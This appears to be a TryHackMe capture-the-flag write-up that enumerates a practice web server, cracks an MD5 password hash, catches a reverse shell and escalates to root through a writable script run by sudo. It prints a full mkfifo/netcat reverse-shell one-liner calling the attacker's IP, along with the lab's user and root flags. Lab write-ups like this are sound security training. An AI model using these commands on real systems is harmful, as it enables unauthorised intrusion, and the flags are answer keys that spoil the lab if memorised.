# Task 1: 
## Question 1:
>What is the user flag?
## Nmap scan
```
$ nmap -sC -sV 10.10.37.233               
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-12 09:12 IST
Nmap scan report for 10.10.37.233
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.75 seconds
```

## Gobuster scan
```
$ gobuster dir -u http://10.10.37.233 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.37.233
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.37.233/content/]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```
![[2 102.png]]

```
$ gobuster dir -u http://10.10.37.233/content -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.37.233/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.37.233/content/_themes/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.37.233/content/as/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.37.233/content/attachment/]
/images               (Status: 301) [Size: 321] [--> http://10.10.37.233/content/images/]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.37.233/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [Size: 317] [--> http://10.10.37.233/content/js/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

![[4 67.png]]

![[5 49.png]]

![[6 40.png]]

| User | Encrypted Password |
| ---- | -------- |
| manager     |     42f749ade7f9e195bf475f37a44cafcb     |

## Hash cracking
```
$ hash-identifier 42f749ade7f9e195bf475f37a44cafcb                     
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

```
$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2023-12-12 09:57) 3.448g/s 115862p/s 115862c/s 115862C/s coco21..181193
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

![[7 33.png]]

## Exploit
![[8 30.png]]

![[9 21.png]]

```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.37.233] 60656
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 07:02:32 up  1:22,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```


```
$ cat /home/itguy/user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}
```

## Privilege escalation
```
$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

```
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

```
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.48.138 9990>/tmp/f' > /etc/copy.sh
```

```
$ sudo /usr/bin/perl /home/itguy/backup.pl
```

```
$ nc -nlvp 9990
listening on [any] 9990 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.37.233] 45084
/bin/sh: 0: can't access tty; job control turned off
# 
```

```
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}
```

#tryhackme #writeup